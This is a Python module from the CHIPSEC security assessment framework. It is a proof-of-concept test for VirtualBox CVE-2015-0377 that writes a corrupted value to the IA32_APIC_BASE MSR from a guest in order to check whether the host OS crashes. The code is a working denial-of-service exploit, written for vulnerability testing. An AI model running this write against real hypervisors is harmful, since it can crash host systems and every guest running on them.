#CHIPSEC: Platform Security Assessment Framework
#Copyright (c) 2010-2016, Intel Corporation
# 
#This program is free software; you can redistribute it and/or
#modify it under the terms of the GNU General Public License
#as published by the Free Software Foundation; Version 2.
#
#This program is distributed in the hope that it will be useful,
#but WITHOUT ANY WARRANTY; without even the implied warranty of
#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#GNU General Public License for more details.
#
#You should have received a copy of the GNU General Public License
#along with this program; if not, write to the Free Software
#Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
#
#Contact information:
#chipsec@intel.com
#



"""
PoC test for Host OS Crash when writing to IA32_APIC_BASE MSR (Oracle VirtualBox CVE-2015-0377)
http://www.oracle.com/technetwork/topics/security/cpujan2015-1972971.html

 Usage:
   ``chipsec_main.py -i -m tools.vmm.vbox_crash_apicbase``
"""

from chipsec.module_common import *

_MODULE_NAME = 'vbox_crash_apicbase'

class vbox_crash_apicbase (BaseModule):

    def run( self, module_argv ):
        self.logger.start_test( "Host OS Crash due to IA32_APIC_BASE (Oracle VirtualBox CVE-2015-0377)" )

        tid = 0
        #(eax, edx) = self.cs.msr.read_msr( tid, 0x1B )
        #self.cs.msr.write_msr( tid, 0x1B, eax, 0xDEADBEEF )
        apicbase_msr = chipsec.chipset.read_register( self.cs, 'IA32_APIC_BASE', tid )
        chipsec.chipset.print_register( self.cs, 'IA32_APIC_BASE', apicbase_msr )
        apicbase_msr = 0xDEADBEEF00000000 | (apicbase_msr & 0xFFFFFFFF)
        self.logger.log( "[*] writing 0x%016X to IA32_APIC_BASE MSR.." % apicbase_msr )
        chipsec.chipset.write_register( self.cs, 'IA32_APIC_BASE', apicbase_msr, tid )

        # If we are here, then we are fine ;)
        self.logger.log_passed_check( "VMM/Host OS didn't crash (not vulnerable)" )
        return ModuleResult.PASSED
